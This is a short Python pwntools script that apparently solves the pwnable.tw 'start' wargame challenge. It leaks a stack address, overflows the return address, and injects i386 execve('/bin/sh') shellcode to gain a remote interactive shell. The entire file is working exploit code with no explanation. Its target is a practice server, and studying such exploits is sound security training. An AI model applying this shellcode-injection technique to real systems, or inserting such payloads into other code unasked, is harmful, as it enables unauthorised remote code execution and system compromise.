#!/usr/bin/env python

from pwn import *
context.log_level="debug"
#p=process(argv=["./start"])

p=remote('chall.pwnable.tw',10000)
context.arch='i386'

#gdb.attach(p,"b *0x804809c")

p.recv()
payload_1=(0xd8-0xc4)*"\x00"+p32(0x0804808B)


p.send(payload_1)

stack_addr=u32(p.recv()[24:28])
log.success(hex(stack_addr))

input_addr=stack_addr-0x1c
ret_addr=stack_addr+0x10
ljust_len=ret_addr-input_addr

shellcode='\xb8\x0b\x00\x00\x00'
shellcode+='\x31\xc9\x31\xd2'
shellcode+='\x8d\x1c\x24'
shellcode+='\xcd\x80'                  # 32 bits program use int 80h, instead of syscall
#shellcode+='\x0f\x05'
log.success(hex(input_addr))
payload=shellcode.ljust(ljust_len)+p32(input_addr)+'/bin/sh\x00'

p.send(payload.ljust(60,'\x00'))



p.interactive()
